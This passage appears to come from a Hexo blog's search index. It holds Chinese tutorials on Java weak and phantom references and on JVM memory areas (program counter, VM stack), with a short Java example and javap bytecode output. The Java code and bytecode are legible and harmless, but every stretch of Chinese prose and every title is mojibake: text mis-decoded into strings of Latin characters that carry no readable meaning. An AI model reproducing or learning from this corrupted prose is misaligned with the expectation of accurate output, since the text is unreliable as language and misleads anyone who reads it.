çš„ç”Ÿæ´»ç”¨å“ã€‚å¼±å¼•ç”¨ä¸è½¯å¼•ç”¨çš„åŒºåˆ«åœ¨äºï¼šåªå…·æœ‰å¼±å¼•ç”¨çš„å¯¹è±¡æ‹¥æœ‰æ›´çŸ­æš‚çš„ç”Ÿå‘½å‘¨æœŸã€‚<strong>åœ¨åƒåœ¾å›æ”¶å™¨çº¿ç¨‹æ‰«æå®ƒæ‰€ç®¡è¾–çš„å†…å­˜åŒºåŸŸçš„è¿‡ç¨‹ä¸­ï¼Œä¸€æ—¦å‘ç°äº†åªå…·æœ‰å¼±å¼•ç”¨çš„å¯¹è±¡ï¼Œä¸ç®¡å½“å‰å†…å­˜ç©ºé—´è¶³å¤Ÿä¸å¦ï¼Œéƒ½ä¼šå›æ”¶å®ƒçš„å†…å­˜</strong>ã€‚ä¸è¿‡ï¼Œç”±äºåƒåœ¾å›æ”¶å™¨æ˜¯ä¸€ä¸ªä¼˜å…ˆçº§å¾ˆä½çš„çº¿ç¨‹ï¼Œ å› æ­¤ä¸ä¸€å®šä¼šå¾ˆå¿«å‘ç°é‚£äº›åªå…·æœ‰å¼±å¼•ç”¨çš„å¯¹è±¡ã€‚å¼±å¼•ç”¨å¯ä»¥å’Œä¸€ä¸ªå¼•ç”¨é˜Ÿåˆ—ï¼ˆReferenceQueueï¼‰è”åˆä½¿ç”¨ï¼Œå¦‚æœå¼±å¼•ç”¨æ‰€å¼•ç”¨çš„å¯¹è±¡è¢«åƒåœ¾å›æ”¶ï¼ŒJava è™šæ‹Ÿæœºå°±ä¼šæŠŠè¿™ä¸ªå¼±å¼•ç”¨åŠ å…¥åˆ°ä¸ä¹‹å…³è”çš„å¼•ç”¨é˜Ÿåˆ—ä¸­ã€‚</p><p><strong>4ï¼è™šå¼•ç”¨ï¼ˆPhantomReferenceï¼‰</strong><br>â€œè™šå¼•ç”¨â€é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å½¢åŒè™šè®¾ï¼Œä¸å…¶ä»–å‡ ç§å¼•ç”¨éƒ½ä¸åŒï¼Œè™šå¼•ç”¨å¹¶ä¸ä¼šå†³å®šå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸã€‚<strong>å¦‚æœä¸€ä¸ªå¯¹è±¡ä»…æŒæœ‰è™šå¼•ç”¨ï¼Œé‚£ä¹ˆå®ƒå°±å’Œæ²¡æœ‰ä»»ä½•å¼•ç”¨ä¸€æ ·ï¼Œåœ¨ä»»ä½•æ—¶å€™éƒ½å¯èƒ½è¢«åƒåœ¾å›æ”¶</strong>ã€‚</p><p><strong>è™šå¼•ç”¨ä¸»è¦ç”¨æ¥è·Ÿè¸ªå¯¹è±¡è¢«åƒåœ¾å›æ”¶çš„æ´»åŠ¨</strong>ã€‚</p><p>è™šå¼•ç”¨ä¸è½¯å¼•ç”¨å’Œå¼±å¼•ç”¨çš„ä¸€ä¸ªåŒºåˆ«åœ¨äºï¼š è™šå¼•ç”¨å¿…é¡»å’Œå¼•ç”¨é˜Ÿåˆ—ï¼ˆReferenceQueueï¼‰è”åˆä½¿ç”¨ã€‚å½“åƒåœ¾å›æ”¶å™¨å‡†å¤‡å›æ”¶ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå¦‚æœå‘ç°å®ƒè¿˜æœ‰è™šå¼•ç”¨ï¼Œå°±ä¼šåœ¨å›æ”¶å¯¹è±¡çš„å†…å­˜ä¹‹å‰ï¼ŒæŠŠè¿™ä¸ªè™šå¼•ç”¨åŠ å…¥åˆ°ä¸ä¹‹å…³è”çš„å¼•ç”¨é˜Ÿåˆ—ä¸­ã€‚ç¨‹åºå¯ä»¥é€šè¿‡åˆ¤æ–­å¼•ç”¨é˜Ÿåˆ—ä¸­æ˜¯å¦å·²ç»åŠ å…¥äº†è™šå¼•ç”¨ï¼Œæ¥äº†è§£è¢«å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦å°†è¦è¢«åƒåœ¾å›æ”¶ã€‚ç¨‹åºå¦‚æœå‘ç°æŸä¸ªè™šå¼•ç”¨å·²ç»è¢«åŠ å…¥åˆ°å¼•ç”¨é˜Ÿåˆ—ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨æ‰€å¼•ç”¨çš„å¯¹è±¡çš„å†…å­˜è¢«å›æ”¶ä¹‹å‰é‡‡å–å¿…è¦çš„è¡ŒåŠ¨ã€‚</p><p>ç‰¹åˆ«æ³¨æ„ï¼Œåœ¨ç¨‹åºè®¾è®¡ä¸­ä¸€èˆ¬<strong>å¾ˆå°‘ä½¿ç”¨å¼±å¼•ç”¨ä¸è™šå¼•ç”¨</strong>ï¼Œä½¿ç”¨è½¯å¼•ç”¨çš„æƒ…å†µè¾ƒå¤šï¼Œè¿™æ˜¯å› ä¸ºè½¯å¼•ç”¨å¯ä»¥åŠ é€Ÿ JVM å¯¹åƒåœ¾å†…å­˜çš„å›æ”¶é€Ÿåº¦ï¼Œå¯ä»¥ç»´æŠ¤ç³»ç»Ÿçš„è¿è¡Œå®‰å…¨ï¼Œé˜²æ­¢å†…å­˜æº¢å‡ºï¼ˆOutOfMemoryï¼‰ç­‰é—®é¢˜çš„äº§ç”Ÿã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVMå†…å­˜åŒºåŸŸ</title>
      <link href="/2023/12/18/JVM1/"/>
      <url>/2023/12/18/JVM1/</url>
      
        <content type="html"><![CDATA[<h1 id="JVMå†…å­˜åŒºåŸŸ"><a href="#JVMå†…å­˜åŒºåŸŸ" class="headerlink" title="JVMå†…å­˜åŒºåŸŸ"></a>JVMå†…å­˜åŒºåŸŸ</h1><p>åœ¨ä¼ ç»Ÿçš„C/C++å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸é€šè¿‡ä½¿ç”¨ç”³è¯·å†…å­˜çš„æ–¹å¼æ¥åˆ›å»ºå¯¹è±¡æˆ–æ˜¯å­˜æ”¾æŸäº›æ•°æ®ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿå¸¦æ¥äº†ä¸€äº›é¢å¤–çš„é—®é¢˜ï¼Œæˆ‘ä»¬è¦åœ¨ä½•æ—¶é‡Šæ”¾è¿™äº›å†…å­˜ï¼Œæ€ä¹ˆæ‰èƒ½ä½¿å¾—å†…å­˜çš„ä½¿ç”¨æœ€é«˜æ•ˆï¼Œå› æ­¤ï¼Œå†…å­˜ç®¡ç†æ˜¯ä¸€ä¸ªéå¸¸ä¸¥è‚ƒçš„é—®é¢˜ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡Cè¯­è¨€<strong>mallocå‡½æ•°</strong>åŠ¨æ€ç”³è¯·å†…å­˜ï¼Œå¹¶ç”¨äºå­˜æ”¾æ•°æ®ï¼Œè€Œåœ¨Javaä¸­ï¼Œè¿™ç§æ“ä½œå®é™…ä¸Šæ˜¯ä¸å…è®¸çš„ï¼ŒJavaåªæ”¯æŒç›´æ¥ä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹å’Œå¯¹è±¡ç±»å‹ï¼Œè‡³äºå†…å­˜åˆ°åº•å¦‚ä½•åˆ†é…ï¼Œå¹¶ä¸æ˜¯ç”±æˆ‘ä»¬æ¥å¤„ç†ï¼Œè€Œæ˜¯JVMå¸®åŠ©æˆ‘ä»¬è¿›è¡Œæ§åˆ¶ï¼Œè¿™æ ·å°±å¸®åŠ©æˆ‘ä»¬èŠ‚çœå¾ˆå¤šå†…å­˜ä¸Šçš„å·¥ä½œï¼Œè™½ç„¶å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œä½†æ˜¯ï¼Œä¸€æ—¦å‡ºç°å†…å­˜é—®é¢˜ï¼Œæˆ‘ä»¬å°±æ— æ³•åƒC/C++é‚£æ ·å¯¹æ‰€ç®¡ç†çš„å†…å­˜è¿›è¡Œåˆç†åœ°å¤„ç†ï¼Œå› ä¸ºæ‰€æœ‰çš„å†…å­˜æ“ä½œéƒ½æ˜¯ç”±JVMåœ¨è¿›è¡Œï¼Œåªæœ‰äº†è§£äº†JVMçš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œæˆ‘ä»¬æ‰èƒ½å¤Ÿåœ¨å‡ºç°å†…å­˜ç›¸å…³é—®é¢˜æ—¶æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚</p><h2 id="å†…å­˜åŒºåŸŸåˆ’åˆ†"><a href="#å†…å­˜åŒºåŸŸåˆ’åˆ†" class="headerlink" title="å†…å­˜åŒºåŸŸåˆ’åˆ†"></a>å†…å­˜åŒºåŸŸåˆ’åˆ†</h2><p>æ—¢ç„¶è¦ç®¡ç†å†…å­˜ï¼Œé‚£ä¹ˆè‚¯å®šä¸ä¼šæ˜¯æ‚ä¹±æ— ç« çš„ï¼ŒJVMå¯¹å†…å­˜çš„ç®¡ç†é‡‡ç”¨çš„æ˜¯åˆ†åŒºæ²»ç†ï¼Œä¸åŒçš„å†…å­˜åŒºåŸŸæœ‰ç€å„è‡ªçš„èŒè´£æ‰€åœ¨ï¼Œåœ¨è™šæ‹Ÿæœºè¿è¡Œæ—¶ï¼Œå†…å­˜åŒºåŸŸå¦‚ä¸‹åˆ’åˆ†ï¼š</p><p><img src="https://pb01.s3.bitiful.net/92.png" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/93.png" alt="avatar"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå†…å­˜åŒºåŸŸä¸€å…±åˆ†ä¸º5ä¸ªåŒºåŸŸï¼Œå…¶ä¸­æ–¹æ³•åŒº,å †å’Œç›´æ¥å†…å­˜æ˜¯æ‰€æœ‰çº¿ç¨‹å…±äº«çš„åŒºåŸŸï¼Œéšç€è™šæ‹Ÿæœºçš„åˆ›å»ºè€Œåˆ›å»ºï¼Œè™šæ‹Ÿæœºçš„ç»“æŸè€Œé”€æ¯ï¼Œè€Œè™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆã€ç¨‹åºè®¡æ•°å™¨éƒ½æ˜¯çº¿ç¨‹ä¹‹é—´ç›¸äº’éš”ç¦»çš„ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„åŒºåŸŸï¼Œå¹¶ä¸”çº¿ç¨‹å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œç»“æŸä¹‹åä¼šè‡ªåŠ¨é”€æ¯ã€‚å†…å­˜åˆ’åˆ†å®Œæˆä¹‹åï¼Œæˆ‘ä»¬çš„JVMæ‰§è¡Œå¼•æ“å’Œæœ¬åœ°åº“æ¥å£ï¼Œä¹Ÿå°±æ˜¯Javaç¨‹åºå¼€å§‹è¿è¡Œä¹‹åå°±ä¼šæ ¹æ®åˆ†åŒºåˆç†åœ°ä½¿ç”¨å¯¹åº”åŒºåŸŸçš„å†…å­˜äº†ã€‚</p><h3 id="å¤§è‡´åˆ’åˆ†"><a href="#å¤§è‡´åˆ’åˆ†" class="headerlink" title="å¤§è‡´åˆ’åˆ†"></a>å¤§è‡´åˆ’åˆ†</h3><h4 id="ç¨‹åºè®¡æ•°å™¨"><a href="#ç¨‹åºè®¡æ•°å™¨" class="headerlink" title="ç¨‹åºè®¡æ•°å™¨"></a>ç¨‹åºè®¡æ•°å™¨</h4><p>é¦–å…ˆæˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹ç¨‹åºè®¡æ•°å™¨ï¼Œå®ƒå’Œæˆ‘ä»¬çš„ä¼ ç»Ÿ8086 CPUä¸­PCå¯„å­˜å™¨çš„å·¥ä½œå·®ä¸å¤šï¼Œå› ä¸ºJVMè™šæ‹Ÿæœºç›®çš„å°±æ˜¯å®ç°ç‰©ç†æœºé‚£æ ·çš„ç¨‹åºæ‰§è¡Œã€‚åœ¨8086 CPUä¸­ï¼ŒPCä½œä¸ºç¨‹åºè®¡æ•°å™¨ï¼Œè´Ÿè´£å‚¨å­˜å†…å­˜åœ°å€ï¼Œè¯¥åœ°å€æŒ‡å‘ä¸‹ä¸€æ¡å³å°†æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œæ¯è§£é‡Šæ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤ï¼ŒPCå¯„å­˜å™¨çš„å€¼å°±ä¼šè‡ªåŠ¨è¢«æ›´æ–°ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªæŒ‡ä»¤å‘¨æœŸæ—¶ï¼Œå°±ä¼šæ ¹æ®å½“å‰åœ°å€æ‰€æŒ‡å‘çš„æŒ‡ä»¤ï¼Œè¿›è¡Œæ‰§è¡Œã€‚</p><p>è€ŒJVMä¸­çš„ç¨‹åºè®¡æ•°å™¨å¯ä»¥çœ‹åšæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œå­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ï¼Œè€Œè¡Œå·æ­£å¥½å°±æŒ‡çš„æ˜¯æŸä¸€æ¡æŒ‡ä»¤ï¼Œå­—èŠ‚ç è§£é‡Šå™¨åœ¨å·¥ä½œæ—¶ä¹Ÿä¼šæ”¹å˜è¿™ä¸ªå€¼ï¼Œæ¥æŒ‡å®šä¸‹ä¸€æ¡å³å°†æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œåˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰åŠŸèƒ½éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªè®¡æ•°å™¨æ¥å®Œæˆã€‚</p><p>å› ä¸ºJavaçš„å¤šçº¿ç¨‹ä¹Ÿæ˜¯ä¾é æ—¶é—´ç‰‡è½®è½¬ç®—æ³•è¿›è¡Œçš„ï¼Œå› æ­¤ä¸€ä¸ªCPUåŒä¸€æ—¶é—´ä¹Ÿåªä¼šå¤„ç†ä¸€ä¸ªçº¿ç¨‹ï¼Œå½“æŸä¸ªçº¿ç¨‹çš„æ—¶é—´ç‰‡æ¶ˆè€—å®Œæˆåï¼Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œï¼Œè€Œå½“å‰çº¿ç¨‹çš„æ‰§è¡Œä½ç½®ä¼šè¢«ä¿å­˜åˆ°å½“å‰çº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨ä¸­ï¼Œå½“ä¸‹æ¬¡è½®è½¬åˆ°æ­¤çº¿ç¨‹æ—¶ï¼Œåˆç»§ç»­æ ¹æ®ä¹‹å‰çš„æ‰§è¡Œä½ç½®ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p><p>ä¸ºäº†çº¿ç¨‹åˆ‡æ¢åèƒ½æ¢å¤åˆ°æ­£ç¡®çš„æ‰§è¡Œä½ç½®ï¼Œæ¯æ¡çº¿ç¨‹éƒ½éœ€è¦æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç¨‹åºè®¡æ•°å™¨ï¼Œå„çº¿ç¨‹ä¹‹é—´è®¡æ•°å™¨äº’ä¸å½±å“ï¼Œç‹¬ç«‹å­˜å‚¨ï¼Œæˆ‘ä»¬ç§°è¿™ç±»å†…å­˜åŒºåŸŸä¸ºâ€œçº¿ç¨‹ç§æœ‰â€çš„å†…å­˜ã€‚</p><p>ç¨‹åºè®¡æ•°å™¨å› ä¸ºåªéœ€è¦è®°å½•å¾ˆå°‘çš„ä¿¡æ¯ï¼Œæ‰€ä»¥åªå ç”¨å¾ˆå°‘ä¸€éƒ¨åˆ†å†…å­˜ã€‚</p><p>âš ï¸ æ³¨æ„ï¼šç¨‹åºè®¡æ•°å™¨æ˜¯å”¯ä¸€ä¸€ä¸ªä¸ä¼šå‡ºç°<strong>OutOfMemoryError</strong>çš„å†…å­˜åŒºåŸŸï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸéšç€çº¿ç¨‹çš„åˆ›å»ºè€Œåˆ›å»ºï¼Œéšç€çº¿ç¨‹çš„ç»“æŸè€Œæ­»äº¡ã€‚</p><h4 id="è™šæ‹Ÿæœºæ ˆ"><a href="#è™šæ‹Ÿæœºæ ˆ" class="headerlink" title="è™šæ‹Ÿæœºæ ˆ"></a>è™šæ‹Ÿæœºæ ˆ</h4><p>è™šæ‹Ÿæœºæ ˆå°±æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„éƒ¨åˆ†ï¼Œçœ‹åå­—å°±çŸ¥é“å®ƒæ˜¯ä¸€ä¸ªæ ˆç»“æ„ï¼Œæ¯ä¸ªæ–¹æ³•è¢«æ‰§è¡Œçš„æ—¶å€™ï¼ŒJavaè™šæ‹Ÿæœºéƒ½ä¼šåŒæ­¥åˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆå…¶å®å°±æ˜¯æ ˆé‡Œé¢çš„ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œæ ˆå¸§ä¸­åŒ…æ‹¬äº†å½“å‰æ–¹æ³•çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ã€‚</p><p><img src="https://pb01.s3.bitiful.net/95.png" alt="avatar"></p><p>å…¶ä¸­å±€éƒ¨å˜é‡è¡¨ä¸»è¦å­˜æ”¾äº†ç¼–è¯‘å™¨å¯çŸ¥çš„å„ç§æ•°æ®ç±»å‹ï¼ˆbooleanã€byteã€charã€shortã€intã€floatã€longã€doubleï¼‰ã€å¯¹è±¡å¼•ç”¨ï¼ˆreference ç±»å‹ï¼Œå®ƒä¸åŒäºå¯¹è±¡æœ¬èº«ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡èµ·å§‹åœ°å€çš„å¼•ç”¨æŒ‡é’ˆï¼Œä¹Ÿå¯èƒ½æ˜¯æŒ‡å‘ä¸€ä¸ªä»£è¡¨å¯¹è±¡çš„å¥æŸ„æˆ–å…¶ä»–ä¸æ­¤å¯¹è±¡ç›¸å…³çš„ä½ç½®ï¼‰ï¼Œåœ¨classæ–‡ä»¶ä¸­å°±å·²ç»å®šä¹‰å¥½äº†</p><p><strong>æ“ä½œæ•°æ ˆ</strong>ä¸»è¦ä½œä¸ºæ–¹æ³•è°ƒç”¨çš„ä¸­è½¬ç«™ä½¿ç”¨ï¼Œç”¨äºå­˜æ”¾æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„<strong>ä¸­é—´è®¡ç®—ç»“æœ</strong>ã€‚å¦å¤–ï¼Œè®¡ç®—è¿‡ç¨‹ä¸­äº§ç”Ÿçš„<strong>ä¸´æ—¶å˜é‡</strong>ä¹Ÿä¼šæ”¾åœ¨æ“ä½œæ•°æ ˆä¸­</p><p>æ¯ä¸ªæ ˆå¸§è¿˜ä¿å­˜äº†ä¸€ä¸ª<strong>å¯ä»¥æŒ‡å‘å½“å‰æ–¹æ³•æ‰€åœ¨ç±»</strong>çš„<strong>è¿è¡Œæ—¶å¸¸é‡æ± </strong>ï¼Œç›®çš„æ˜¯ï¼šå½“å‰æ–¹æ³•ä¸­å¦‚æœéœ€è¦è°ƒç”¨å…¶ä»–æ–¹æ³•çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä»è¿è¡Œæ—¶å¸¸é‡æ± ä¸­æ‰¾åˆ°å¯¹åº”çš„ç¬¦å·å¼•ç”¨ï¼Œç„¶åå°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ï¼Œç„¶åå°±èƒ½ç›´æ¥è°ƒç”¨å¯¹åº”æ–¹æ³•ï¼Œè¿™å°±æ˜¯åŠ¨æ€é“¾æ¥</p><p><img src="https://pb01.s3.bitiful.net/94.png" alt="avatar"></p><p>æœ€åæ˜¯<strong>æ–¹æ³•å‡ºå£</strong>ï¼Œä¹Ÿå°±æ˜¯æ–¹æ³•è¯¥å¦‚ä½•ç»“æŸï¼Œæ˜¯æŠ›å‡ºå¼‚å¸¸è¿˜æ˜¯æ­£å¸¸è¿”å›ï¼Œä¸ç®¡å“ªç§è¿”å›æ–¹å¼ï¼Œéƒ½ä¼šå¯¼è‡´æ ˆå¸§è¢«å¼¹å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ æ ˆå¸§éšç€æ–¹æ³•è°ƒç”¨è€Œåˆ›å»ºï¼Œéšç€æ–¹æ³•ç»“æŸè€Œé”€æ¯ã€‚æ— è®ºæ–¹æ³•æ­£å¸¸å®Œæˆè¿˜æ˜¯å¼‚å¸¸å®Œæˆéƒ½ç®—ä½œæ–¹æ³•ç»“æŸã€‚</p><p>ç¨‹åºè¿è¡Œä¸­æ ˆå¯èƒ½ä¼šå‡ºç°ä¸¤ç§é”™è¯¯ï¼š</p><ul><li><strong>StackOverFlowError</strong>ï¼š è‹¥æ ˆçš„å†…å­˜å¤§å°ä¸å…è®¸åŠ¨æ€æ‰©å±•ï¼Œé‚£ä¹ˆå½“çº¿ç¨‹è¯·æ±‚æ ˆçš„æ·±åº¦è¶…è¿‡å½“å‰ Java è™šæ‹Ÿæœºæ ˆçš„æœ€å¤§æ·±åº¦çš„æ—¶å€™ï¼Œå°±æŠ›å‡º StackOverFlowError é”™è¯¯ã€‚</li><li><strong>OutOfMemoryError</strong>ï¼š å¦‚æœæ ˆçš„å†…å­˜å¤§å°å¯ä»¥åŠ¨æ€æ‰©å±•ï¼Œ å¦‚æœè™šæ‹Ÿæœºåœ¨åŠ¨æ€æ‰©å±•æ ˆæ—¶æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿçš„å†…å­˜ç©ºé—´ï¼Œåˆ™æŠ›å‡ºOutOfMemoryErrorå¼‚å¸¸ã€‚</li></ul><p>è¿™é‡Œæˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹æ•´ä¸ªè™šæ‹Ÿæœºæ ˆçš„è¿ä½œæµç¨‹ï¼Œæˆ‘ä»¬å…ˆç¼–å†™ä¸€ä¸ªæµ‹è¯•ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> a();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">a</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">b</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> c();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">c</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çš„ä¸»æ–¹æ³•æ‰§è¡Œåï¼Œä¼šä¾æ¬¡æ‰§è¡Œä¸‰ä¸ªæ–¹æ³•<code>a() -&gt; b() -&gt; c() -&gt; è¿”å›</code>ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥è§‚å¯Ÿä¸€ä¸‹åç¼–è¯‘ä¹‹åçš„ç»“æœï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> com.test.Main();   #è¿™ä¸ªæ˜¯æ„é€ æ–¹æ³•</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="number">1</span>: invokespecial #<span class="number">1</span>                  <span class="comment">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">         <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">3</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">5</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lcom/test/Main;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span>;    #ä¸»æ–¹æ³•</span><br><span class="line">    descriptor: ([Ljava/lang/String;)V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">2</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: invokestatic  #<span class="number">2</span>                  <span class="comment">// Method a:()I</span></span><br><span class="line">         <span class="number">3</span>: istore_1</span><br><span class="line">         <span class="number">4</span>: getstatic     #<span class="number">3</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">         <span class="number">7</span>: iload_1</span><br><span class="line">         <span class="number">8</span>: invokevirtual #<span class="number">4</span>                  <span class="comment">// Method java/io/PrintStream.println:(I)V</span></span><br><span class="line">        <span class="number">11</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">5</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">6</span>: <span class="number">4</span></span><br><span class="line">        line <span class="number">7</span>: <span class="number">11</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>      <span class="number">12</span>     <span class="number">0</span>  args   [Ljava/lang/String;</span><br><span class="line">            <span class="number">4</span>       <span class="number">8</span>     <span class="number">1</span>   res   I</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">a</span><span class="params">()</span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">0</span>, args_size=<span class="number">0</span></span><br><span class="line">         <span class="number">0</span>: invokestatic  #<span class="number">5</span>                  <span class="comment">// Method b:()I</span></span><br><span class="line">         <span class="number">3</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">10</span>: <span 